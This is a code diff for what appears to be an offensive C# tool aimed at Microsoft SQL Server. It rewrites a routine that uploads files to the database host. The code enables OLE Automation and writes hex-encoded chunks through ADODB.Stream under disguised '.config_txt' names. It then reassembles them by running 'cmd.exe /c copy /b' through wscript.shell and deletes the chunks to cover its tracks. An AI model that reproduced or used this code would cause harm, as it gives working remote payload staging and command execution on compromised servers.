@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections;
 using System.Collections.Generic;
 using System.Data;
@@ -131,6 +131,51 @@ exit                       - terminates the server process (and this session)"
             return arrlist;
         }
 
+        static byte[] ReadFileToByte(string filePath)
+        {
+            byte[] result;
+            try
+            {
+                using (FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
+                {
+                    byte[] array = new byte[fileStream.Length];
+                    fileStream.Read(array, 0, array.Length);
+                    result = array;
+                }
+            }
+            catch
+            {
+                result = null;
+            }
+            return result;
+        }
+
+        static private List<int> SplitFileSize(int fileSize, int splitLength)
+        {
+            List<int> list = new List<int>();
+            if (fileSize > splitLength)
+            {
+                int num = fileSize / splitLength;
+                int num2 = fileSize % splitLength;
+                if (num > 0)
+                {
+                    for (int i = 0; i < num; i++)
+                    {
+                        list.Add(splitLength);
+                    }
+                    if (num2 != 0)
+                    {
+                        list.Add(num2);
+                    }
+                }
+            }
+            else
+            {
+                list.Add(fileSize);
+            }
+            return list;
+        }
+
         /// <summary>
         /// 文件上传，使用 OLE Automation Procedures 的 ADODB.Stream
         /// </summary>
@@ -140,22 +185,30 @@ exit                       - terminates the server process (and this session)"
         {
             Console.WriteLine(String.Format("[*] Uploading '{0}' to '{1}'...", localFile, remoteFile));
 
-            if (setting.Check_configuration("Ole Automation Procedures", 0))
+            if (setting.Check_configuration("Ole Automation Procedures", 0) && !setting.Enable_ola())
             {
-                if (setting.Enable_ola()) return;
+                 return;
             }
-
-            int count = 0;
+            byte[] byteArray = ReadFileToByte(localFile);
+            string text = "copy /b ";
+            if (setting.File_Exists(remoteFile, 1))
+            {
+                Console.WriteLine("[+] {0} Exists", remoteFile);
+                return;
+            }
+            int num = 0;
+            int num2 = 0;
+            int splitLength = 250000;
+            List<int> list = SplitFileSize(byteArray.Length, splitLength);
             try
             {
-                string hexString = string.Concat(File.ReadAllBytes(localFile).Select(b => b.ToString("X2")));
-                ArrayList arrlist = GetSeparateSubString(hexString, 150000);
-
-                foreach (string hex150000 in arrlist)
+                foreach (int num3 in list)
                 {
-                    count++;
-                    string filePath = String.Format("{0}_{1}.config_txt", remoteFile, count);
-
+                    string text2 = string.Format("{0}_{1}.config_txt", remoteFile, num);
+                    byte[] array = new byte[num3];
+                    Array.Copy(byteArray, num2, array, 0, num3);
+                    string hexstr = string.Concat(from b in array
+                                                  select b.ToString("X2"));
                     sqlstr = String.Format(@"
                         DECLARE @ObjectToken INT
                         EXEC sp_OACreate 'ADODB.Stream', @ObjectToken OUTPUT
@@ -164,52 +217,46 @@ exit                       - terminates the server process (and this session)"
                         EXEC sp_OAMethod @ObjectToken, 'Write', NULL, 0x{0}
                         EXEC sp_OAMethod @ObjectToken, 'SaveToFile', NULL,'{1}', 2
                         EXEC sp_OAMethod @ObjectToken, 'Close'
-                        EXEC sp_OADestroy @ObjectToken", hex150000, filePath);
+                        EXEC sp_OADestroy @ObjectToken", hexstr, text2);
                     Batch.RemoteExec(Conn, sqlstr, false);
-                    if (setting.File_Exists(filePath, 1))
-                    {
-                        Console.WriteLine("[+] {0}-{1} Upload completed", arrlist.Count, count);
-                    }
-                    else
-                    {
-                        Console.WriteLine("[!] {0}-{1} Error uploading", arrlist.Count, count);
-                        Conn.Close();
-                        Environment.Exit(0);
-                    }
+                    num2 += num3;
+                    num++;
+                    text = text + "\"" + text2 + "\"+";
+                    if (setting.File_Exists(text2, 1))
+                       {
+                           Console.WriteLine("[+] {0}_{1}.config_txt Upload completed", remoteFile, num);
+                       }
+                       else
+                       {
+                           Console.WriteLine("[!] {0}_{1}.config_txt Error uploading", remoteFile, num);
+                           Conn.Close();
+                           Environment.Exit(0);
+                       }
 
-                    Thread.Sleep(5000);
+                    Thread.Sleep(1000);
                 }
 
+                text = text.Trim(new char[]
+                {
+                                    '+'
+                }) + " \"" + remoteFile + "\"'";
                 string shell = String.Format(@"
                     DECLARE @SHELL INT 
                     EXEC sp_oacreate 'wscript.shell', @SHELL OUTPUT 
                     EXEC sp_oamethod @SHELL, 'run' , NULL, 'c:\windows\system32\cmd.exe /c ");
 
-                sqlstr = "copy /b ";
-                for (int i = 1; i < count + 1; i++)
-                {
-                    if (i != count)
-                    {
-                        sqlstr += String.Format(@"{0}_{1}.config_txt+", remoteFile, i);
-                    }
-                    else
-                    {
-                        sqlstr += String.Format(@"{0}_{1}.config_txt {0}'", remoteFile, i);
-                    }
-                }
-
                 Console.WriteLine(@"[+] copy /b {0}_x.config_txt {0}", remoteFile);
-                Batch.RemoteExec(Conn, shell + sqlstr, false);
-                Thread.Sleep(5000);
-
-                sqlstr = String.Format(@"del {0}*.config_txt'", remoteFile.Replace(Path.GetFileName(remoteFile), ""));
-                Console.WriteLine("[+] {0}", sqlstr.Replace("'", ""));
-                Batch.RemoteExec(Conn, shell + sqlstr, false);
+                Batch.RemoteExec(Conn,shell + text, false);
+                Thread.Sleep(1000);
 
                 if (setting.File_Exists(remoteFile, 1))
                 {
+                    sqlstr = String.Format(@"del {0}*.config_txt'", remoteFile.Replace(Path.GetFileName(remoteFile), ""));
+                    Console.WriteLine("[+] {0}", sqlstr.Replace("'", ""));
+                    Batch.RemoteExec(Conn, shell + sqlstr, false);
                     Console.WriteLine("[*] '{0}' Upload completed", localFile);
                 }
+                //setting.Disable_ole();
             }
             catch (Exception ex)
             {
